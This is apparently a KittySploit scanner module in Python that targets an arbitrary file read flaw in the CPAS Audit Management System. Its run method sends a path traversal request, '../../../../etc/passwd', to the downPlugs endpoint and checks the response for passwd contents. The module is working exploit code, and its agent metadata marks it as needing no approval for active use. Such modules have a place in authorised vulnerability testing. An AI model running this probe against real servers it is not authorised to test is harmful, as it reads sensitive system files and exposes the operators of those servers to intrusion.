#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""The CPAS Audit Management System has been found to contain a vulnerability that allows arbitrary file read."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'CPAS Management System - Arbitrary File Read Detection',
        'description': 'The CPAS Audit Management System has been found to contain a vulnerability that allows arbitrary file read. This security flaw can be exploited by attackers to access sensitive files on the server, potentially exposing critical system information. The vulnerability can be triggered by sending a specially crafted HTTP GET request to the endpoint /cpasm4/plugInManController/downPlugs with parameters fileId and fileName, enabling the retrieval of arbitrary files such as /etc/passwd. This issue poses a significant risk to system security and should be addressed immediately to prevent unauthorized access and potential data breaches.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'vulnerability', 'cpas', 'cms', 'lfi', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://github.com/wy876/POC/blob/main/%E5%8C%97%E4%BA%AC%E5%8F%8B%E6%95%B0%E8%81%9A%E7%A7%91%E6%8A%80/CPAS%E5%AE%A1%E8%AE%A1%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.md',
        ],
    }

    def run(self):
        path = '/cpasm4/plugInManController/downPlugs?fileId=../../../../etc/passwd&fileName'
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        header_all = ('multipart/form-data', 'fileName=',)
        body_regexes = ('root:.*:0:0:',)
        if (all(m in headers for m in header_all)) and (any(re.search(rx, body) for rx in body_regexes)):
            self.set_info(
                severity='high',
                reason='CPAS Management System - Arbitrary File Read detected',
                path=path,
            )
            return True
        return False

